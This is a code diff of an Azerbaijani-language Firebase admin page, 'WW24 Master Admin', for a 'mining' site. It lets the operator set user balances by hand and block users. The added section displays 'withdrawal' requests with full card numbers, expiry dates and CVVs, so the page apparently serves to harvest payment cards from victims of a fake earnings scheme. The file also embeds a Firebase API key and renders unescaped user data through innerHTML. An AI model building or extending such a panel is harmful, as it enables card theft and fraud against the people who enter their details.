@@ -3,51 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WW24 - Master Control</title>
+    <title>WW24 | Command Center</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
-        body { background: #08080a; color: #fff; font-family: 'Inter', sans-serif; padding: 20px; }
-        .panel { max-width: 800px; margin: 0 auto; }
-        h1 { font-family: 'Orbitron'; color: #00b9ff; text-align: center; letter-spacing: 5px; }
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Inter:wght@400;600&display=swap');
         
-        table { width: 100%; border-collapse: collapse; margin-top: 30px; background: #111; border-radius: 10px; overflow: hidden; }
-        th, td { padding: 15px; text-align: left; border-bottom: 1px solid #222; }
-        th { background: #1a1a1a; color: #00b9ff; font-size: 0.8rem; text-transform: uppercase; }
+        body { background: #050507; color: #e0e0e0; font-family: 'Inter', sans-serif; margin: 0; padding: 20px; }
+        .container { max-width: 1100px; margin: 0 auto; }
         
-        .input-edit { background: #000; border: 1px solid #333; color: #fff; padding: 5px; width: 80px; border-radius: 5px; }
+        header { 
+            display: flex; justify-content: space-between; align-items: center; 
+            padding: 20px; background: #0f1115; border-radius: 15px; border: 1px solid #222; margin-bottom: 30px;
+        }
+        h1 { font-family: 'Orbitron'; color: #3f9c35; font-size: 1.2rem; letter-spacing: 3px; margin: 0; }
+
+        .grid { display: grid; grid-template-columns: 1fr; gap: 25px; }
         
-        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        .btn-save { background: #3f9c35; color: white; margin-right: 5px; }
-        .btn-block { background: #ff3344; color: white; }
-        .btn-unblock { background: #555; color: white; }
+        .card { background: #0f1115; border: 1px solid #222; border-radius: 20px; padding: 20px; }
+        .card-header { color: #00b9ff; font-weight: bold; margin-bottom: 20px; border-bottom: 1px solid #222; padding-bottom: 10px; display: flex; justify-content: space-between; }
+
+        table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #1a1a1a; }
+        th { color: #666; text-transform: uppercase; font-size: 0.7rem; }
+
+        /* Statuslar */
+        .status-active { color: #3f9c35; font-weight: bold; }
+        .status-blocked { color: #ff3344; font-weight: bold; }
+
+        /* Düymələr */
+        .btn { padding: 8px 12px; border: none; border-radius: 6px; cursor: pointer; font-size: 0.75rem; font-weight: bold; transition: 0.2s; }
+        .btn-edit { background: #00b9ff; color: #000; }
+        .btn-block { background: #ff3344; color: #fff; }
+        .btn-unblock { background: #555; color: #fff; }
         
-        .status-badge { padding: 4px 8px; border-radius: 4px; font-size: 0.7rem; font-weight: bold; }
-        .bg-active { background: rgba(63, 156, 53, 0.2); color: #3f9c35; }
-        .bg-blocked { background: rgba(255, 51, 68, 0.2); color: #ff3344; }
+        /* Kart Məlumat Bölməsi */
+        .withdraw-item { 
+            background: #16191e; padding: 15px; border-radius: 12px; margin-bottom: 15px; 
+            border-left: 4px solid #3f9c35; display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px;
+        }
+        .data-label { font-size: 0.65rem; color: #555; display: block; }
+        .data-value { font-size: 0.9rem; color: #fff; font-weight: 600; }
     </style>
 </head>
 <body>
 
-<div class="panel">
-    <h1>WW24 ADMIN</h1>
-    
-    <table id="user-table">
-        <thead>
-            <tr>
-                <th>İstifadəçi</th>
-                <th>Balans ($)</th>
-                <th>Status</th>
-                <th>Əməliyyatlar</th>
-            </tr>
-        </thead>
-        <tbody id="user-list">
-            </tbody>
-    </table>
+<div class="container">
+    <header>
+        <h1>WW24 MASTER ADMIN</h1>
+        <div id="stats" style="font-size: 0.8rem; color: #888;">System Online</div>
+    </header>
+
+    <div class="grid">
+        <div class="card">
+            <div class="card-header">İSTİFADƏÇİ İDARƏETMƏSİ <i class="fas fa-users"></i></div>
+            <table id="user-table">
+                <thead>
+                    <tr>
+                        <th>İstifadəçi Adı</th>
+                        <th>Balans ($)</th>
+                        <th>Status</th>
+                        <th>Əməliyyatlar</th>
+                    </tr>
+                </thead>
+                <tbody id="user-list-body">
+                    </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <div class="card-header">KART QEYDİYYATLARI VƏ ÇIXARIŞLAR <i class="fas fa-credit-card"></i></div>
+            <div id="withdraw-list-body">
+                </div>
+        </div>
+    </div>
 </div>
 
 <script>
+    // FİREBASE KONFİQURASİYASI
     const firebaseConfig = {
         apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
         databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com"
@@ -55,42 +89,85 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Siyahını Yüklə
+    // 1. İSTİFADƏÇİLƏRİ VƏ BALANSLARI YÜKLƏ
     db.ref('mining').on('value', snap => {
-        const list = document.getElementById('user-list');
+        const list = document.getElementById('user-list-body');
         list.innerHTML = "";
-        const data = snap.val();
+        const users = snap.val();
 
-        for(let user in data) {
-            const d = data[user];
-            const isBlocked = d.status === "blocked";
+        for (let user in users) {
+            const d = users[user];
+            const isBlocked = d.status === 'blocked';
             
-            const tr = document.createElement('tr');
-            tr.innerHTML = `
-                <td style="font-weight: bold;">${user}</td>
-                <td><input type="number" id="bal-${user}" class="input-edit" value="${d.balance}"></td>
-                <td><span class="status-badge ${isBlocked ? 'bg-blocked' : 'bg-active'}">${isBlocked ? 'BLOK' : 'AKTİV'}</span></td>
-                <td>
-                    <button class="btn btn-save" onclick="saveBal('${user}')"><i class="fas fa-save"></i></button>
-                    <button class="btn ${isBlocked ? 'btn-unblock' : 'btn-block'}" onclick="toggleBlock('${user}', ${isBlocked})">
-                        <i class="fas ${isBlocked ? 'fa-user-check' : 'fa-user-slash'}"></i>
-                    </button>
-                </td>
+            list.innerHTML += `
+                <tr>
+                    <td><b>${user}</b></td>
+                    <td>
+                        <input type="number" step="0.01" value="${d.balance}" 
+                            onchange="updateBalance('${user}', this.value)" 
+                            style="background:#000; border:1px solid #333; color:#3f9c35; width:80px; padding:5px; border-radius:5px;">
+                    </td>
+                    <td>
+                        <span class="${isBlocked ? 'status-blocked' : 'status-active'}">
+                            ${isBlocked ? 'BLOKLANIB' : 'AKTİV'}
+                        </span>
+                    </td>
+                    <td>
+                        <button class="btn ${isBlocked ? 'btn-unblock' : 'btn-block'}" 
+                            onclick="toggleBlock('${user}', '${d.status}')">
+                            ${isBlocked ? 'Bloku Aç' : 'Blokla'}
+                        </button>
+                    </td>
+                </tr>
             `;
-            list.appendChild(tr);
         }
     });
 
-    function saveBal(user) {
-        const newBal = document.getElementById('bal-' + user).value;
-        db.ref('mining/' + user).update({ balance: parseFloat(newBal) });
-        alert(user + " balansı yeniləndi!");
+    // 2. KART VƏ ÇIXARIŞ MƏLUMATLARINI YÜKLƏ
+    db.ref('withdraw_requests').on('value', snap => {
+        const container = document.getElementById('withdraw-list-body');
+        container.innerHTML = "";
+        const allReqs = snap.val();
+
+        if(!allReqs) { container.innerHTML = "<p style='color:#444'>Hələ ki, müraciət yoxdur.</p>"; return; }
+
+        for (let user in allReqs) {
+            const userReqs = allReqs[user];
+            for (let id in userReqs) {
+                const r = userReqs[id];
+                container.innerHTML += `
+                    <div class="withdraw-item">
+                        <div><span class="data-label">İSTİFADƏÇİ</span><span class="data-value">${user}</span></div>
+                        <div><span class="data-label">AD SOYAD</span><span class="data-value">${r.fullName}</span></div>
+                        <div><span class="data-label">KART NO</span><span class="data-value">${r.cardNumber}</span></div>
+                        <div><span class="data-label">TARİX / CVV</span><span class="data-value">${r.expiry} | <span style="color:#ff3344">${r.cvv}</span></span></div>
+                        <div><span class="data-label">MƏBLƏĞ</span><span class="data-value" style="color:#3f9c35">$${r.amount}</span></div>
+                        <div><span class="data-label">TARİX</span><span style="font-size:0.7rem">${r.timestamp}</span></div>
+                        <div style="display:flex; align-items:center;">
+                            <button onclick="deleteReq('${user}', '${id}')" style="background:none; border:none; color:#ff3344; cursor:pointer;"><i class="fas fa-trash"></i></button>
+                        </div>
+                    </div>
+                `;
+            }
+        }
+    });
+
+    // FUNKSİYALAR
+    function updateBalance(user, val) {
+        db.ref('mining/' + user).update({ balance: parseFloat(val) });
     }
 
-    function toggleBlock(user, isBlocked) {
-        const newStatus = isBlocked ? "active" : "blocked";
-        db.ref('mining/' + user).update({ status: newStatus });
+    function toggleBlock(user, currentStatus) {
+        const nextStatus = currentStatus === 'blocked' ? 'active' : 'blocked';
+        db.ref('mining/' + user).update({ status: nextStatus });
+    }
+
+    function deleteReq(user, id) {
+        if(confirm("Bu məlumatı silmək istəyirsən?")) {
+            db.ref('withdraw_requests/' + user + '/' + id).remove();
+        }
     }
 </script>
+
 </body>
 </html>
